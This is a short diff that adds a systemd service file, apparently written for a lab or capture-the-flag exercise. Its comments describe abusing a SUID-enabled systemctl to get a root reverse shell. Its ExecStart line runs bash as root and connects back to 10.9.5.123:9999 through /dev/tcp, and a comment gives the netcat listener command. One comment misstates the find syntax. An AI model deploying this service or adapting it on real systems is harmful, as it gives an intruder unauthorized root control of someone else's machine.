@@ -1,0 +1,13 @@
+# service file to gain reverse shell attack (listen for the 9999 port with "nc -lvp 9999")
+# explores the SUID set on systemctl, systemctl should have SUID set
+# found the SUID set using find -u=s
+
+[Unit]
+Description=rooot
+[Service]
+Type=simple
+user=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.5.123/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
